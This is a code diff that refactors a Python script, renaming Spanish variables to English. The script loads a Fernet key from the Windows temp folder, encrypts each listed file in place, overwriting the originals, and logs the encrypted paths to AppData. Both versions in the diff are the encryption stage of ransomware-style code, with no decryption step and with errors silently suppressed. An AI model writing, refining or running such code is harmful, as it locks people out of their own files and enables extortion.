@@ -2,46 +2,44 @@ import sys
 from cryptography.fernet import Fernet
 import os
 
-temp_dir = os.path.expandvars(r"%APPDATA%")
+encrypted_list=[]
 
-clave = Fernet.generate_key()
-ruta_clave = os.path.join(temp_dir, "clave.key")
+appdata_dir = os.path.expandvars(r"%APPDATA%")
+temp_dir = os.path.expandvars(r"%tmp%")
 
-with open(ruta_clave, "wb") as clave_archivo:
-    clave_archivo.write(clave)
+key_file_path = os.path.join(temp_dir, "pass.key")
 
-with open(ruta_clave, "rb") as clave_archivo:
-    clave = clave_archivo.read()
+with open(key_file_path, "rb") as key_file:
+    encryption_key = key_file.read()
 
-fernet = Fernet(clave)
+fernet = Fernet(encryption_key)
 
-temp_dir = os.path.expandvars(r"%APPDATA%")
-file_path=os.path.join(temp_dir, "allfiles.txt")
+file_list_path = os.path.join(appdata_dir, "allfiles.txt")
 
-if sys.argv[1] == file_path:
-    with open(file_path, 'r') as f:
-      archivos = f.read().strip().split(',')
-
+if sys.argv[1] == file_list_path:
+    with open(file_list_path, 'r') as f:
+        file_list = f.read().strip().split(',')
 else:
-    archivos = sys.argv[1].strip().split(",")
+    file_list = sys.argv[1].strip().split(",")
 
-for archivo in archivos:
-    if os.path.exists(archivo) and archivo != file_path:  
-        with open(archivo, "rb") as file:
-            datos = file.read() 
+for file_path in file_list:
+    if os.path.exists(file_path) and file_path != file_list_path:
+        with open(file_path, "rb") as f:
+            original_data = f.read()
 
-        datos_encriptados = fernet.encrypt(datos)
+        encrypted_data = fernet.encrypt(original_data)
         try:
-          with open(archivo, "wb") as file:
-             file.write(datos_encriptados)
+            with open(file_path, "wb") as f:
+                f.write(encrypted_data)
         except:
-          pass
-        
-        ruta_lista = os.path.join(temp_dir, "encrypted_files.txt")
+            pass
 
-        with open(ruta_lista, "a") as lista_archivo:
-            lista_archivo.write(f"{archivo}\n")
+        encrypted_log_path = os.path.join(appdata_dir, "encrypted_files.txt")
+        encrypted_list.append(file_path)
+        with open(encrypted_log_path, "a") as log_file:
+            log_file.write(f"{file_path}\n")
+	
     else:
-        print(f"File ‘{archivo}’ does not exist.")
+        print(f"File '{file_path}' does not exist.")
 
-print(f"Files has been successfully encrypted.")
+print(f"Files {encrypted_list} have been successfully encrypted.")
